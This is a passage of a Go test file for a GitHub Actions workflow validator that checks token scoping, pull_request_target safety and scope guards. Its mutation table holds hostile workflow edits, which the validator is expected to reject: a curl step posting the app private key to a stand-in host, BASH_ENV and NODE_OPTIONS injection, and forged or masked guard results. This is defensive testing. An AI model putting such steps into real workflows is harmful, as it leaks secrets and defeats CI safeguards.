            build-mode: none
          - language: javascript-typescript
            build-mode: none
          - language: go
            build-mode: autobuild
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/autobuild@deadbeef
      - uses: github/codeql-action/analyze@deadbeef

  preflight:
    name: Release preflight
    runs-on: ubuntu-latest
    steps:
      - run: true

  install-verification:
    name: Release install verification
    runs-on: ubuntu-latest
    steps:
      - run: true

  release:
    name: Publish release artifacts
    needs:
      - codeql-preflight
      - preflight
      - install-verification
    runs-on: ubuntu-latest
    steps:
      - run: true
`), 0o644); err != nil {
		t.Fatalf("WriteFile(release.yml) error = %v", err)
	}
}

func TestCheckWorkflowsRecognizesRequiredJobNames(t *testing.T) {
	root := t.TempDir()
	installWorkflowToolStubs(t, root)
	workflowDir := filepath.Join(root, ".github", "workflows")
	if err := os.MkdirAll(workflowDir, 0o755); err != nil {
		t.Fatalf("MkdirAll() error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(workflowDir, "ci.yml"), []byte(`name: CI

on:
  workflow_dispatch:

jobs:
  validate:
    name: Validate repository
    runs-on: ubuntu-latest
    steps:
      - run: true

  container-smoke:
    name: Container smoke
    runs-on: ubuntu-latest
    steps:
      - run: true

  reproducible-build:
    name: Reproducible build
    runs-on: ubuntu-latest
    steps:
      - run: true

  hostile-env:
    name: Hostile environment (${{ matrix.axis }})
    runs-on: ubuntu-latest
    strategy:
      matrix:
        include:
          - axis: tmpdir
          - axis: workspace
          - axis: root
          - axis: uidmap
    steps:
      - run: true
`), 0o644); err != nil {
		t.Fatalf("WriteFile(ci.yml) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(workflowDir, "security.yml"), []byte(`name: Security

on:
  workflow_dispatch:

jobs:
  actionlint:
    name: GitHub Actions lint
    runs-on: ubuntu-latest
    steps:
      - run: true

  zizmor:
    name: GitHub Actions security analysis
    runs-on: ubuntu-latest
    steps:
      - run: true
`), 0o644); err != nil {
		t.Fatalf("WriteFile(security.yml) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(workflowDir, "pr-base-policy.yml"), []byte(`name: PR base policy

on:
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    name: Allowed PR base
    runs-on: ubuntu-latest
    steps:
      - run: true
`), 0o644); err != nil {
		t.Fatalf("WriteFile(pr-base-policy.yml) error = %v", err)
	}
	writeWorkflowValidationFixtures(t, workflowDir)

	policyPath := filepath.Join(root, "policy.toml")
	if err := os.WriteFile(policyPath, []byte(`[required_status_checks]
contexts = [
  "Allowed PR base",
  "Validate repository",
  "Container smoke",
  "Reproducible build",
  "GitHub Actions lint",
  "GitHub Actions security analysis",
  "Hostile environment (tmpdir)",
  "Hostile environment (workspace)",
  "Hostile environment (root)",
  "Hostile environment (uidmap)",
]
`), 0o644); err != nil {
		t.Fatalf("WriteFile(policy.toml) error = %v", err)
	}

	if err := metadatautil.CheckWorkflows(root, policyPath); err != nil {
		t.Fatalf("metadatautil.CheckWorkflows() error = %v", err)
	}
}

func TestCheckWorkflowsRejectsMultilineSpoofedName(t *testing.T) {
	root := t.TempDir()
	installWorkflowToolStubs(t, root)
	workflowDir := filepath.Join(root, ".github", "workflows")
	if err := os.MkdirAll(workflowDir, 0o755); err != nil {
		t.Fatalf("MkdirAll() error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(workflowDir, "ci.yml"), []byte(`name: CI

on:
  workflow_dispatch:

env:
  SPOOFED_NAME: |
    name: Validate repository

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - run: true
`), 0o644); err != nil {
		t.Fatalf("WriteFile(ci.yml) error = %v", err)
	}
	writeWorkflowValidationFixtures(t, workflowDir)

	policyPath := filepath.Join(root, "policy.toml")
	if err := os.WriteFile(policyPath, []byte(`[required_status_checks]
contexts = [
  "Validate repository",
]
`), 0o644); err != nil {
		t.Fatalf("WriteFile(policy.toml) error = %v", err)
	}

	err := metadatautil.CheckWorkflows(root, policyPath)
	if err == nil {
		t.Fatal("metadatautil.CheckWorkflows() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "Validate repository") {
		t.Fatalf("metadatautil.CheckWorkflows() error = %v, want missing Validate repository", err)
	}
}

func TestSafePullRequestTargetWorkflowAllowsTrustedPRBasePolicy(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    name: Allowed PR base
    runs-on: ubuntu-latest
    steps:
      - run: true
`
	if err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml"); err != nil {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsCheckout(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    name: Allowed PR base
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted checkout under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not checkout repository contents") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want checkout rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsJobLevelPermissions(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    name: Allowed PR base
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: true
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted job-level permissions under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not grant job-level permissions") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want job-level permissions rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsInlineJobLevelPermissions(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs: { pr-base-policy: { name: Allowed PR base, runs-on: ubuntu-latest, permissions: { contents: write }, steps: [ { run: true } ] } }
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted inline job-level permissions under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not grant job-level permissions") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want job-level permissions rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsReusableWorkflowCalls(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    uses: ./.github/workflows/reusable.yml
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted reusable workflow invocation under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not call reusable workflows") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want reusable workflow rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsInlineReusableWorkflowCalls(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs: { pr-base-policy: { uses: ./.github/workflows/reusable.yml } }
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted inline reusable workflow invocation under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not call reusable workflows") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want reusable workflow rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsInlineStepUses(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs: { pr-base-policy: { name: Allowed PR base, runs-on: ubuntu-latest, steps: [ { uses: evil/action@0123456789012345678901234567890123456789 } ] } }
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted inline external action under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not use external actions") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want external action rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRejectsInlineCheckout(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  # kusari-inspector suppress: trusted metadata-only pull_request_target exception.
  pull_request_target:
    types:
      - opened

permissions: {}

jobs: { pr-base-policy: { name: Allowed PR base, runs-on: ubuntu-latest, steps: [ { uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd } ] } }
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted inline checkout under pull_request_target")
	}
	if !strings.Contains(err.Error(), "must not checkout repository contents") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want checkout rejection", err)
	}
}

func TestSafePullRequestTargetWorkflowRequiresSuppressionComment(t *testing.T) {
	t.Parallel()

	workflow := `name: PR base policy

on:
  pull_request_target:
    types:
      - opened

permissions: {}

jobs:
  pr-base-policy:
    name: Allowed PR base
    runs-on: ubuntu-latest
    steps:
      - run: true
`
	err := metadatautil.IsSafePullRequestTargetWorkflow(workflow, ".github/workflows/pr-base-policy.yml")
	if err == nil {
		t.Fatal("metadatautil.IsSafePullRequestTargetWorkflow() unexpectedly accepted a pull_request_target workflow without a Kusari suppression comment")
	}
	if !strings.Contains(err.Error(), "must document the reviewed Kusari suppression") {
		t.Fatalf("metadatautil.IsSafePullRequestTargetWorkflow() error = %v, want Kusari suppression rejection", err)
	}
}

func TestValidateReleaseWorkflowControlPlaneFlowRejectsMissingCanonicalArtifact(t *testing.T) {
	t.Parallel()
	releaseWorkflow := `      - name: Generate preflight control-plane manifest
        run: |
          mkdir -p dist
          ./scripts/generate-control-plane-manifest.sh dist/workcell-control-plane-preflight.json

      - name: Regenerate control-plane manifest from archived source tree
        env:
          WORKCELL_CONTROL_PLANE_ROOT: ${{ github.workspace }}/dist/release-source
        run: ./scripts/generate-control-plane-manifest.sh dist/workcell-control-plane-archived.json

      - name: Verify control-plane manifest matches preflight
        run: |
          cmp -s \
            dist/workcell-control-plane-archived.json \
            dist/preflight/workcell-control-plane-preflight.json
`

	err := metadatautil.ValidateReleaseWorkflowControlPlaneFlow(releaseWorkflow)
	if err == nil {
		t.Fatal("metadatautil.ValidateReleaseWorkflowControlPlaneFlow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "dist/workcell-control-plane.json") {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowControlPlaneFlow() error = %v, want canonical control-plane artifact path", err)
	}
}

func TestValidateReleaseWorkflowControlPlaneFlowAcceptsCanonicalArtifact(t *testing.T) {
	t.Parallel()
	releaseWorkflow := `      - name: Generate preflight control-plane manifest
        run: |
          mkdir -p dist
          ./scripts/generate-control-plane-manifest.sh dist/workcell-control-plane-preflight.json

      - name: Regenerate control-plane manifest from archived source tree
        env:
          WORKCELL_CONTROL_PLANE_ROOT: ${{ github.workspace }}/dist/release-source
        run: ./scripts/generate-control-plane-manifest.sh dist/workcell-control-plane.json

      - name: Verify control-plane manifest matches preflight
        run: |
          cmp -s \
            dist/workcell-control-plane.json \
            dist/preflight/workcell-control-plane-preflight.json
`

	if err := metadatautil.ValidateReleaseWorkflowControlPlaneFlow(releaseWorkflow); err != nil {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowControlPlaneFlow() error = %v", err)
	}
}

func TestValidateMacOSInstallVerificationFlowRejectsMissingBundleUninstall(t *testing.T) {
	t.Parallel()
	workflow := `      - name: Upload CI release install artifacts
        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6.0.0
        with:
          name: workcell-ci-install-candidate

      - name: Download CI release install artifacts
        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6.0.0
        with:
          name: workcell-ci-install-candidate
          path: dist/install

  install-verification:
    name: Install verification (${{ matrix.runner_label }})
    strategy:
      matrix:
        include:
          - runner: macos-26
            runner_label: macos-26
          - runner: macos-15
            runner_label: macos-15
    steps:
      - run: |
          bundle_path="$(find dist/install -maxdepth 1 -type f -name 'workcell-*.tar.gz' -print -quit)"
          "${bundle_dir}/scripts/install.sh"
          brew tap-new "${tap_name}" --no-git
          brew --repo "${tap_name}"
          brew install "${tap_name}/workcell"
          brew uninstall --force "${tap_name}/workcell"
          brew list --versions workcell
`

	err := metadatautil.ValidateMacOSInstallVerificationFlow(workflow, ".github/workflows/ci.yml", "workcell-ci-install-candidate", "name: Install verification (${{ matrix.runner_label }})")
	if err == nil {
		t.Fatal("metadatautil.ValidateMacOSInstallVerificationFlow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "scripts/uninstall.sh") {
		t.Fatalf("metadatautil.ValidateMacOSInstallVerificationFlow() error = %v, want missing bundle uninstall check", err)
	}
}

func TestValidateMacOSInstallVerificationFlowAcceptsCanonicalFlow(t *testing.T) {
	t.Parallel()
	workflow := `      - name: Upload CI release install artifacts
        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6.0.0
        with:
          name: workcell-ci-install-candidate

  install-verification:
    name: Install verification (${{ matrix.runner_label }})
    strategy:
      matrix:
        include:
          - runner: macos-26
            runner_label: macos-26
          - runner: macos-15
            runner_label: macos-15
    steps:
      - uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6.0.0
      - run: |
          bundle_path="$(find dist/install -maxdepth 1 -type f -name 'workcell-*.tar.gz' -print -quit)"
          "${bundle_dir}/scripts/install.sh"
          "${bundle_dir}/scripts/uninstall.sh"
          brew tap-new "${tap_name}" --no-git
          brew --repo "${tap_name}"
          brew install "${tap_name}/workcell"
          brew uninstall --force "${tap_name}/workcell"
          brew list --versions workcell
`

	if err := metadatautil.ValidateMacOSInstallVerificationFlow(workflow, ".github/workflows/ci.yml", "workcell-ci-install-candidate", "name: Install verification (${{ matrix.runner_label }})"); err != nil {
		t.Fatalf("metadatautil.ValidateMacOSInstallVerificationFlow() error = %v", err)
	}
}

func TestValidateCodeQLWorkflowRejectsGoBuildlessMode(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  analyze:
    strategy:
      matrix:
        include:
          - language: rust
            build-mode: none
          - language: javascript-typescript
            build-mode: none
          - language: go
            build-mode: none
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/analyze@deadbeef
`

	err := metadatautil.ValidateCodeQLWorkflow(workflow, ".github/workflows/codeql.yml")
	if err == nil {
		t.Fatal("metadatautil.ValidateCodeQLWorkflow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "build-mode: none") {
		t.Fatalf("metadatautil.ValidateCodeQLWorkflow() error = %v, want go build-mode rejection", err)
	}
}

func TestValidateCodeQLWorkflowAcceptsGoAutobuild(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  analyze:
    strategy:
      matrix:
        include:
          - language: rust
            build-mode: none
          - language: javascript-typescript
            build-mode: none
          - language: go
            build-mode: autobuild
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/autobuild@deadbeef
      - uses: github/codeql-action/analyze@deadbeef
`

	if err := metadatautil.ValidateCodeQLWorkflow(workflow, ".github/workflows/codeql.yml"); err != nil {
		t.Fatalf("metadatautil.ValidateCodeQLWorkflow() error = %v", err)
	}
}

func TestValidateReleaseWorkflowCodeQLFlowRejectsMissingGoAutobuild(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  preflight:
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/analyze@deadbeef

  release:
    needs:
      - preflight
`

	err := metadatautil.ValidateReleaseWorkflowCodeQLFlow(workflow)
	if err == nil {
		t.Fatal("metadatautil.ValidateReleaseWorkflowCodeQLFlow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "Release CodeQL") {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowCodeQLFlow() error = %v, want missing release CodeQL job", err)
	}
}

func TestValidateReleaseWorkflowCodeQLFlowAcceptsMatrixJob(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  codeql-preflight:
    name: Release CodeQL (${{ matrix.language }})
    strategy:
      matrix:
        include:
          - language: rust
            build-mode: none
          - language: javascript-typescript
            build-mode: none
          - language: go
            build-mode: autobuild
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/autobuild@deadbeef
      - uses: github/codeql-action/analyze@deadbeef

  release:
    needs:
      - codeql-preflight
      - preflight
      - install-verification
`

	if err := metadatautil.ValidateReleaseWorkflowCodeQLFlow(workflow); err != nil {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowCodeQLFlow() error = %v", err)
	}
}

func TestValidateCIWorkflowPRShapeFlowRejectsLegacyInlineShapeGate(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  pr-shape:
    name: Pull request shape
    steps:
      - uses: actions/checkout@deadbeef
        with:
          fetch-depth: 0
      - name: Check pull request shape
        if: ${{ github.event_name == 'pull_request' }}
        env:
          WORKCELL_PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
        run: |
          git fetch --no-tags --prune origin "${WORKCELL_PR_BASE_REF}"
          ./scripts/check-pr-shape.sh --base-ref "origin/${WORKCELL_PR_BASE_REF}" --head-ref HEAD --max-files 25 --max-lines 1200 --max-areas 8 --max-binaries 0
      - name: Skip outside pull requests
        if: ${{ github.event_name != 'pull_request' }}
        run: echo "PR shape gate applies only to pull requests."
`

	err := metadatautil.ValidateCIWorkflowPRShapeFlow(workflow)
	if err == nil {
		t.Fatal("metadatautil.ValidateCIWorkflowPRShapeFlow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "./scripts/ci/job-pr-shape.sh --base") {
		t.Fatalf("metadatautil.ValidateCIWorkflowPRShapeFlow() error = %v, want shared job gate", err)
	}
}

func TestValidateCIWorkflowPRShapeFlowAcceptsSharedJobGate(t *testing.T) {
	t.Parallel()
	workflow := `jobs:
  pr-shape:
    name: Pull request shape
    steps:
      - uses: actions/checkout@deadbeef
        with:
          fetch-depth: 0
      - name: Check pull request shape
        if: ${{ github.event_name == 'pull_request' }}
        env:
          WORKCELL_PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
        run: ./scripts/ci/job-pr-shape.sh --base "${WORKCELL_PR_BASE_REF}"
      - name: Skip outside pull requests
        if: ${{ github.event_name != 'pull_request' }}
        run: echo "PR shape gate applies only to pull requests."
`

	if err := metadatautil.ValidateCIWorkflowPRShapeFlow(workflow); err != nil {
		t.Fatalf("metadatautil.ValidateCIWorkflowPRShapeFlow() error = %v", err)
	}
}

const upstreamRefreshWorkflowFixture = `name: Upstream refresh

on:
  workflow_dispatch:

env:
  WORKCELL_COSIGN_VERSION: v3.0.6

jobs:
  refresh:
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    permissions:
      contents: read
      issues: write
      pull-requests: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        with:
          fetch-depth: 0
          persist-credentials: false
      - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
        with:
          cosign-release: ${{ env.WORKCELL_COSIGN_VERSION }}
      - run: sudo install -m 0755 "$(command -v cosign)" /usr/local/bin/cosign
      - if: steps.existing_pr.outputs.provider == ''
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: |
          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
          unset GITHUB_TOKEN GH_TOKEN
          trap 'rm -f "${token_file}"' EXIT
          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-provider-pins.sh --apply | tee provider.log
          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-provider-pins.sh --check
          ./scripts/check-pinned-inputs.sh
          ./scripts/ci/upstream-refresh-candidate.sh provider "${RUNNER_TEMP}/upstream-refresh-candidate"
      - if: steps.existing_pr.outputs.toolchain == ''
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: |
          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
          unset GITHUB_TOKEN GH_TOKEN
          trap 'rm -f "${token_file}"' EXIT
          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --apply --toolchain-only | tee apply.log
          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/update-upstream-pins.sh --check --toolchain-only
          ./scripts/check-pinned-inputs.sh
          ./scripts/ci/upstream-refresh-candidate.sh toolchain "${RUNNER_TEMP}/upstream-refresh-candidate"
      - run: |
          jq -n '{version:1}' > metadata.json
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: upstream-refresh-candidate
          path: metadata.json
      - env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh issue create --title "Upstream refresh candidate" --body "metadata.json"
  scope-guard:
    runs-on: ubuntu-latest
    needs: refresh
    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'
    outputs:
      result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: upstream-refresh-candidate
          path: ${{ runner.temp }}/candidate
      - id: guard
        shell: bash --noprofile --norc -euo pipefail {0}
        continue-on-error: true
        run: |
          ./scripts/ci/upstream-refresh-scope-guard.sh "${RUNNER_TEMP}/candidate/provider/patch"
  publish:
    runs-on: ubuntu-latest
    needs: [refresh, scope-guard]
    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'
    environment:
      name: upstream-refresh
    permissions:
      contents: read
      issues: write
    steps:
      - id: app-token
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3
        with:
          client-id: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}
          private-key: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}
          permission-contents: write
          permission-pull-requests: write
      - shell: bash --noprofile --norc -euo pipefail {0}
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}
        run: |
          ./scripts/ci/upstream-refresh-publish.sh candidate "${SCOPE_GUARD_RESULT}" audit.md
`

func TestValidateUpstreamRefreshWorkflowAcceptsCanonicalFlow(t *testing.T) {
	t.Parallel()
	workflow := upstreamRefreshWorkflowFixture
	if err := metadatautil.ValidateUpstreamRefreshWorkflow(workflow); err != nil {
		t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v", err)
	}
	assertManualWorkflowMainRefGuard(t, workflow, metadatautil.ValidateUpstreamRefreshWorkflow)
}

func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
	t.Parallel()
	mutations := []struct {
		name, old, replacement, want string
	}{
		{"refresh job PR creation", `gh issue create --title "Upstream refresh candidate" --body "metadata.json"`, "gh issue create --title x\n          gh pr create --draft", "refresh job must not contain"},
		{"refresh job contents write", "      contents: read\n      issues: write", "      contents: write\n      issues: write", "refresh job must grant exactly"},
		{"publish pull-requests write", "      contents: read\n      issues: write\n    steps:\n      - id: app-token", "      contents: read\n      pull-requests: write\n      issues: write\n    steps:\n      - id: app-token", "publish job must grant exactly"},
		{"refresh job environment", "  refresh:\n", "  refresh:\n    environment:\n      name: upstream-refresh\n", "refresh job must not bind an environment"},
		{"refresh job mints App token", "      - run: |\n          jq -n", "      - uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1\n      - run: |\n          jq -n", "must not mint the GitHub App token"},
		{"scope-guard extra permission", "      contents: read\n    steps:\n      - uses: actions/checkout", "      contents: read\n      issues: write\n    steps:\n      - uses: actions/checkout", "scope-guard job must run the scope guard"},
		{"scope-guard result forged", "result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}", "result: passed", "must export result from the guard step outcome"},
		{"scope-guard failure masked", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/provider/patch\"", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/provider/patch\" || true\n          echo result=passed >> \"${GITHUB_OUTPUT}\"", "scope-guard job must run the scope guard as its only run step"},
		{"scope-guard shell override", "        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error", "        shell: sh -c 'exit 0' {0}\n        continue-on-error", "scope-guard job must run the scope guard as its only run step"},
		{"scope-guard second run step", "      - id: guard\n", "      - run: echo 'exit 0' > ./scripts/ci/upstream-refresh-scope-guard.sh\n      - id: guard\n", "reviewed checkout, candidate download"},
		{"scope-guard renamed step", "      - id: guard\n", "      - id: check\n", "scope-guard job must run the scope guard as its only run step"},
		{"publish contents write", "      contents: read\n      issues: write\n    steps:\n      - id: app-token", "      contents: write\n      issues: write\n    steps:\n      - id: app-token", "publish job must grant exactly"},
		{"publish missing environment", "    environment:\n      name: upstream-refresh\n", "", "publish job must bind the upstream-refresh environment"},
		{"scope-guard checkout from another repository", "          persist-credentials: false\n      - uses: actions/download", "          persist-credentials: false\n          repository: evil/other\n      - uses: actions/download", "reviewed checkout, candidate download"},
		{"refresh publishes behind a line continuation", "          gh issue create --title \"Upstream refresh candidate\"", "          gh pr \\\n            create --fill\n          gh issue create --title \"Upstream refresh candidate\"", "must not contain \"gh pr create\""},
		{"publish missing scope-guard need", "needs: [refresh, scope-guard]", "needs: [refresh]", "publish job must need exactly"},
		{"publish step chains another command", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n          gh pr merge 1\n", "must run only the publish script"},
		{"publish step reads the private key", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: echo\n", "App token only in the publish script step"},
		{"publish service reads the private key", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    services:\n      s:\n        image: registry.example.invalid/x\n        credentials:\n          username: u\n          password: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "must not run in a container or services"},
		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
		{"scope-guard loses continue-on-error", "        continue-on-error: true\n", "", "scope-guard job must run the scope guard as its only run step"},
		{"scope-guard job env sets BASH_ENV", "  scope-guard:\n", "  scope-guard:\n    env:\n      BASH_ENV: ./exit0.sh\n", "not inherit workflow or job env"},
		{"workflow env sets NODE_OPTIONS", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  NODE_OPTIONS: --require=${{ github.workspace }}/wrapper.js\n", "not inherit workflow or job env"},
		{"publish job env sets BASH_ENV", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      BASH_ENV: ./wrapper.sh\n", "not inherit workflow or job env"},
		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - env:", "must run only the publish script"},
